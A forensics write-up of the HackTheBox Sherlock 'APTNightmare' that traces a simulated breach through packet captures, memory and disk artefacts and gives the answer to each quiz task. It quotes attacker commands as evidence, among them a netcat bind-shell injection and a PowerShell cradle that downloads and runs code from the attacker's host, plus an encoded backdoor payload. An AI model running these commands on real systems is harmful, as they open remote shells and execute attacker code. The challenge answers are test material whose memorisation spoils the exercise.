# [HackTheBox Sherlocks - APTNightmare](https://app.hackthebox.com/sherlocks/APTNightmare)
Created: 03/06/2024 05:32
Last Updated: 03/06/2024 23:56
* * *
![860b7a99fedc090cba521dd48de219ee.png](/resources/860b7a99fedc090cba521dd48de219ee-1.png)
**Scenario:**
We neglected to prioritize the robust security of our network and servers, and as a result, both our organization and our customers have fallen victim to a cyber attack. The origin and methods of this breach remain unknown. Numerous suspicious emails have been detected. In our pursuit of resolution, As an expert forensics investigator, you must be able to help us.

* * *
>Task 1: What is the IP address of the infected web server?

![15a0abb3b96a1a555c45d45b72c7e615.png](/resources/15a0abb3b96a1a555c45d45b72c7e615-1.png)
First, I filtered for http protocol then we can see which IP address is the webserver and which one is the attacker IP address
```
192.168.1.3
```

>Task 2: What is the IP address of the Attacker?
```
192.168.1.5
```

>Task 3: How many open ports were discovered by the attacker?

![2ab57db4ffc9122cd1d33f7d5dcf8c66.png](/resources/2ab57db4ffc9122cd1d33f7d5dcf8c66-1.png)
If we're looking at this image, we can see that the attacker conducted port scan on web server 
![adb0dc085b5794d8bfb6e933b60de5d5.png](/resources/adb0dc085b5794d8bfb6e933b60de5d5-1.png)
I used `ip.dst == 192.168.1.5 && ip.src == 192.168.1.3 && tcp.flags.syn == 1 && tcp.flags.ack == 1` to filter for response from web server since we know that if targeted port sent SYN, ACK packet back that mean that port is opened
![65c3891cbfe5f120370052048138ad44.png](/resources/65c3891cbfe5f120370052048138ad44-1.png)
To make things easier, lets export this filter a file
![f318c4ae1ba7128610e929b2dab5c68b.png](/resources/f318c4ae1ba7128610e929b2dab5c68b-1.png)
We will see that if we filtered for unique port, then we will found 15 ports that responsed back to the attacker with SYN,ACK packet but 15 is not the right answer yet

![e0c61568011d26bf9470d0485516f7cf.png](/resources/e0c61568011d26bf9470d0485516f7cf-1.png)
If we go back to Wireshark and filter for each port then we can see that at first port 5555 sent RST, ACK back to the attacker and later it was used for reverse shell
```
14
```

>Task 4: What are the first five ports identified by the attacker in numerical order during the enumeration phase, not considering the sequence of their discovery?
```
25,53,80,110,119
```

>Task 5: The attacker exploited a misconfiguration allowing them to enumerate all subdomains. This misconfiguration is commonly referred to as (e.g, Unrestricted Access Controls)?

![a491b8aa3217e9179a8a23ea056a728c.png](/resources/a491b8aa3217e9179a8a23ea056a728c-1.png)
Enumerate domain, it has to be DNS so lets filter for it
![fe919f290ef30624ed36dcebe9b490ea.png](/resources/fe919f290ef30624ed36dcebe9b490ea-1.png)
the attacker somehow sent DNS query to web server which was response back with all subdomains

![a630ab4560dcf3a2e417e214311c80b7.png](/resources/a630ab4560dcf3a2e417e214311c80b7-1.png)
The exploited of this misconfiguration is called DNS Zone Transfer
```
DNS Zone Transfer
```

>Task 6: How many subdomains were discovered by the attacker?

![fe919f290ef30624ed36dcebe9b490ea.png](/resources/fe919f290ef30624ed36dcebe9b490ea-1.png)
```
9
```

>Task 7: What is the compromised subdomain (e.g., dev.example.com) ?

![2d76b730658bd0947011ebb9abc3808b.png](/resources/2d76b730658bd0947011ebb9abc3808b-1.png)
Later, the attacker tried to brute force login page on webserver which we can obtain subdomain here
```
sysmon.cs-corp.cd
```

>Task 8: What email address and password were used to log in (e.g., user@example.com:password123)?

Eariler we know that if the attacker used invalid credential, web server will response back with HTTP 200 
![37b16d43eb54cc2f8b901f45b1177383.png](/resources/37b16d43eb54cc2f8b901f45b1177383-1.png)
So I used `(ip.addr == 192.168.1.5 && http) && (http.response.code == 302)` to look for Redirect response after authentication was successful
![e7f1e38bd93acddab4071ad36af8dcb8.png](/resources/e7f1e38bd93acddab4071ad36af8dcb8-1.png)
Here is credential in url decoded format
![c8213c359d6b20f5ccb1bc8678d29c22.png](/resources/c8213c359d6b20f5ccb1bc8678d29c22-1.png)
We can obtain unformatted credential here and don't forget to add domain for admin user to answer this task
```
admin@cs-corp.cd:Pass@000_
```


![b5e500a4eb34ba38bb28860fc392bf70.png](/resources/b5e500a4eb34ba38bb28860fc392bf70-1.png)
After login, the attacker was redirected to `/dashboard.php` and look like this dashboard was used to execute commands
![5d625b55a5d88f1cd9d319b24398b509.png](/resources/5d625b55a5d88f1cd9d319b24398b509-1.png)
The attacker started with `du` and `ps`
![0263a3c8e589b0800c10d26894787e78.png](/resources/0263a3c8e589b0800c10d26894787e78-1.png)
And this is how web server responded back, look like we can bypass this to execute arbitrary command

>Task 9: What command gave the attacker their initial access ?

![37f21fd9adc3343e7d8f8173d030e98a.png](/resources/37f21fd9adc3343e7d8f8173d030e98a-1.png)
We know that an `/dashboard.php` can be abused to execute arbitrary command here and look like an attacker successfully executed to listen connection on port 5555 and its a bind shell (not reverse shell as we thought)
```
|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe
```

>Task 10: What is the CVE identifier for the vulnerability that the attacker exploited to achieve privilege escalation (e.g, CVE-2016-5195) ?

![df83c953b4f991791a94e82a49c6bfcd.png](/resources/df83c953b4f991791a94e82a49c6bfcd-1.png)
After the attacker connected to bind shell on port 5555, he used [pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) which is a local privilege escalation vulnerability on Linux

```
CVE-2021-4034
```

>Task 11: What is the MITRE ID of the technique used by the attacker to achieve persistence (e.g, T1098.001)?

![8ca8388360cdf0ed489772001e0fde44.png](/resources/8ca8388360cdf0ed489772001e0fde44-1.png)
After successfully obtained root privilege, the attacker downloaded 3 files from his HTTP server to `/var/www/html/download/`
![76f73e68068488f0b947a9a6e88602bb.png](/resources/76f73e68068488f0b947a9a6e88602bb-1.png)
The attacker tried to edit cronjob using nano but couldnt, so he replaced crontab file for persistence
![3a497bfa41b582736f839f15252b4ba6.png](/resources/3a497bfa41b582736f839f15252b4ba6-1.png)
Created a cronjob is T1053.003 according to MITRE ATT&CK
```
T1053.003
```

>Task 12: The attacker tampered with the software hosted on the 'download' subdomain with the intent of gaining access to end-users. What is the Mitre ATT&CK technique ID for this attack?

![682ecc1caf83068c823e146e57fe0906.png](/resources/682ecc1caf83068c823e146e57fe0906-1.png)
```
T1195.002
```

>Task 13: What command provided persistence in the cs-linux.deb file?

![39416f5ea0478c487bfd900c2fd12ff2.png](/resources/39416f5ea0478c487bfd900c2fd12ff2-1.png)
Lets grab this file
![3b5dd907d14c1e6b2c17629e2569ff73.png](/resources/3b5dd907d14c1e6b2c17629e2569ff73-1.png)
Then we will use `dpkg-deb -x cs-linux.deb ./out/` to decompress it
![b91157a06f331811d2d33286f37cc643.png](/resources/b91157a06f331811d2d33286f37cc643-1.png)
Look like it was a python script for something

```
import base64
import zlib

# Encoded and compressed payload
encoded_compressed_payload = 'eJw9UN9LwzAQfl7+irCHNcEsrqMbOmxBxAcRGTjfRKRNT1uaJiWXaqfo325Dh/dwx3f33Xc/6razzlO0qgEvvnRdiCJH2CYCveuVF75uQVgkxKLEI3po2RxUZanCpa5NP9DFgmYZ/T2XY2Pl1JyTN+voQGtDXW7egcUrviMz746jn2E6zZJTYGtxwof9zf3r4enx9vqBB55U1hhQnrEovlzLeHshY7mJRDIaD4zCQd6QGQwKOh+kw6oSNUDHNpzodLpA9qbLVcOi7C4SKB2oDzYKPK9eSJmesObks6o1UA2GlfxKj3Ll2X91OaU5gQEUC0+SJSjbdg4Q2fQvWWyTkCwhMMV3hNEOfzj5Axx7baM='

# Decode from base64
decoded_data = base64.b64decode(encoded_compressed_payload)

# Decompress using zlib
decompressed_data = zlib.decompress(decoded_data)

# Print the decompressed data
print(decompressed_data.decode('utf-8'))
```

I asked ChatGPT to write a script to decode it without directly executed base64 payload

![bc20d76e7528d13315f7f4e455f3fce5.png](/resources/bc20d76e7528d13315f7f4e455f3fce5-1.png)
Then we will have this decoded python script that will create a connection to the attacker IP address on port 4444 for persistence

```
echo cs-linux && >> ~/.bashrc
```

>Task 14: The attacker sent emails to employees, what the name for the running process that allowed this to occur?

![f01ccfb90f06a491d2a2f0887741b31e.png](/resources/f01ccfb90f06a491d2a2f0887741b31e-1.png)
After moved provided ubuntu profile to plugin/overlays/linux then we can use `linux_pstree` plugin to list all process in tree then we can see that citserver is the one we're looking for
![c2e1b59fc7b4ae7d44b43cb64c65098c.png](/resources/c2e1b59fc7b4ae7d44b43cb64c65098c-1.png)
```
citserver
```

>Task 15: We received phishing email can you provide subject of email ?

![ce50aa1716e775c6af611ac12e1de807.png](/resources/ce50aa1716e775c6af611ac12e1de807-1.png)
I tried to find any log related to mail and citadel but didn't find anything so the only way I could think of was to used `strings Memory_WebServer.mem | grep "Subject:"` to display email header that was embbed in this memory file directly and look like it worked

```
Review Revised Privacy Policy
```

>Task 16: What is the name of the malicious attachment?


![4ca636dfb4fc1a574184f881f871b2da.png](/resources/4ca636dfb4fc1a574184f881f871b2da-1.png)
I used Jumplist that found on `C:\Users\ceo-us\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations` to find this answer, we can see that `policy.docm` is the suspicious macro document file and it is what we're looking for

```
policy.docm
```

>Task 17: Please identify the usernames of the CEOs who received the attachment.

![fd8693d7278fd5e2ed63d5b154f0ad57.png](/resources/fd8693d7278fd5e2ed63d5b154f0ad57-1.png)
I used `strings Memory_WebServer.mem | grep "Return-Path"`, we only got 1 username but we have ceo-us user folder in disk file collected with KAPE so it has to be ceo-ru and us

```
ceo-ru, ceo-us
```

>Task 18: What is the hostname for the compromised CEO?

![f2d58e1e550431e4ef415988ec039b2b.png](/resources/f2d58e1e550431e4ef415988ec039b2b-1.png)
I queried this registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters` to obtain a hostname of this machine that has ceo-us as one of users
```
DESKTOP-ELS5JAK
```

>Task 19: What is the full path for the malicious attachment?

![4ca636dfb4fc1a574184f881f871b2da.png](/resources/4ca636dfb4fc1a574184f881f871b2da-1.png)
```
C:\Users\ceo-us\Downloads\policy.docm
```

>Task 20: Can you provide the command used to gain initial access?

![d53f8b2efb9f0f621b891b8087c7bd37.png](/resources/d53f8b2efb9f0f621b891b8087c7bd37-1.png)
I found this command on PowerShell event log which later will be answered what kind of threat is this file
```
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))
```

>Task 21: Provide a Popular threat label for the malicious executable used to gain initial access?

![31223defcde3f159a2bc2f0c11ef40ad.png](/resources/31223defcde3f159a2bc2f0c11ef40ad-1.png)
On wireshark, I search for port 806 that we found from previous task
![110d0985a6e914124733f45d94b049d2.png](/resources/110d0985a6e914124733f45d94b049d2-1.png)
We can see that its a large size based64 encoded powershell script  

![26d608c2a3459699e6d982b77ef1ff77.png](/resources/26d608c2a3459699e6d982b77ef1ff77-1.png)
So I copied it content and saved as sus.ps1

![156457242660edb44aae726e6c103fa9.png](/resources/156457242660edb44aae726e6c103fa9-1.png)
Then generate file hash

![1e716a5f660ca7ab92224112c49805ba.png](/resources/1e716a5f660ca7ab92224112c49805ba-1.png)
Searched on VirusTotal, Its malicious as expected but still not the one we're looking for
![4f5ca8b2dc82f1f6269062ca021b01d1.png](/resources/4f5ca8b2dc82f1f6269062ca021b01d1-1.png)
To obtain the right answer, we need to go to Dropped Files and we can see there is one malicious exe file right there

![b7f8b22d87c8ad2b2689c88af355429b.png](/resources/b7f8b22d87c8ad2b2689c88af355429b-1.png)
It is the one, we're looking for which is a cobalt strike beacon
```
trojan.cobaltstrike/beacon
```

>Task 22: What is the payload type?

![40329c2a6b3bfbec71ca57446ea78279.png](/resources/40329c2a6b3bfbec71ca57446ea78279-1.png)
I used an file that the attacker uploaded to web server with [1768.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) to obtained this answer > `python3 1768.py cs-windows.exe`
```
windows-beacon_http-reverse_http
```

>Task 23: What is task name has been add by attacker?

![008c70bd737114cfed005dee0f927e4e.png](/resources/008c70bd737114cfed005dee0f927e4e-1.png)
I went to Schedule task folder and there is 1 task that was modified when an incident occurs
![effbb81da48c45cd5ef045e124bbb36f.png](/resources/effbb81da48c45cd5ef045e124bbb36f-1.png)
And look like this is the one
```
WindowsUpdateCheck
```

![6cfaf193d0089ef8ad35aadb27dbf868.png](/resources/6cfaf193d0089ef8ad35aadb27dbf868.png)
https://labs.hackthebox.com/achievement/sherlock/1438364/612
* * *